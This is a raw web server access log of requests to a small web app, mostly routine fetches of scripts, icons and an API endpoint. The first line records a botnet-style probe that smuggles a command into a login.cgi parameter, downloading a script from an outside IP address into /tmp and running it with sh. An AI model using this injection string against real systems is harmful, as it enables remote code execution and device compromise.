188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
172.31.23.250 - - [05/Sep/2018:07:14:32 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:14:32 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:07:14:33 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:14 +0000] "GET /favicon.ico HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:15 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:16 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:16 +0000] "GET /[object%20Object] HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:16 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:07:15:16 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:17 +0000] "GET /precache-manifest.84e2f4b9dd7cce9a8cd9d2addfbd218e.js HTTP/1.1" 200 170 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:19 +0000] "GET /index.html HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:19 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:23 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:07:15:25 +0000] "GET /robots.txt HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:27 +0000] "GET /favicon.ico HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:28 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:29 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:07:15:37 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:40 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:40 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:40 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:07:15:40 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.13.179 - - [05/Sep/2018:07:29:57 +0000] "GET / HTTP/1.1" 200 1647 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0" "196.52.43.96"
172.31.23.250 - - [05/Sep/2018:08:18:24 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:18:24 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:18:24 +0000] "GET / HTTP/1.1" 502 575 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:25 +0000] "GET /favicon.ico HTTP/1.1" 502 575 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:28 +0000] "GET /undefined/service-worker.js HTTP/1.1" 502 575 "https://eyeofhorus.codigoaberto.io/undefined/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:29 +0000] "GET / HTTP/1.1" 502 575 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:29 +0000] "GET /favicon.ico HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:36 +0000] "GET / HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:37 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:37 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:38 +0000] "GET /[object%20Object] HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:39 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:39 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:18:39 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:18:39 +0000] "GET /precache-manifest.84e2f4b9dd7cce9a8cd9d2addfbd218e.js HTTP/1.1" 200 170 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:40 +0000] "GET /index.html HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:18:40 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:03 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:03 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:03 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:03 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:04 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:13 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:13 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:13 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:13 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:14 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:33 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:33 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:34 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:34 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:35 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:37 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:37 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:19:37 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:37 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:19:39 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:48 +0000] "GET / HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:49 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:50 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:50 +0000] "GET /[object%20Object] HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:50 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:50 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.13.179 - - [05/Sep/2018:08:19:51 +0000] "GET /precache-manifest.84e2f4b9dd7cce9a8cd9d2addfbd218e.js HTTP/1.1" 200 170 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:51 +0000] "GET /index.html HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:19:51 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:20:48 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:20:48 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:20:51 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "177.134.78.59"
172.31.13.179 - - [05/Sep/2018:08:20:51 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:21:43 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:21:44 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:21:44 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:21:45 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:21:46 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:21:58 +0000] "GET /favicon.ico HTTP/1.1" 200 853 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:21:59 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:00 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:00 +0000] "GET /[object%20Object] HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:00 +0000] "GET /%PUBLIC_URL%/favicon.ico HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:22:00 +0000] "GET /service-worker.js HTTP/1.1" 200 654 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:01 +0000] "GET /precache-manifest.84e2f4b9dd7cce9a8cd9d2addfbd218e.js HTTP/1.1" 200 170 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:02 +0000] "GET /index.html HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:02 +0000] "GET /bundle.js HTTP/1.1" 200 70929 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:05 +0000] "GET /%PUBLIC_URL%/manifest.json HTTP/1.1" 400 173 "-" "-" "-"
172.31.23.250 - - [05/Sep/2018:08:22:07 +0000] "GET /robots.txt HTTP/1.1" 200 853 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:09 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:09 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
172.31.23.250 - - [05/Sep/2018:08:22:09 +0000] "GET /[object%20Object] HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/favicon.ico" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36" "177.134.78.59"
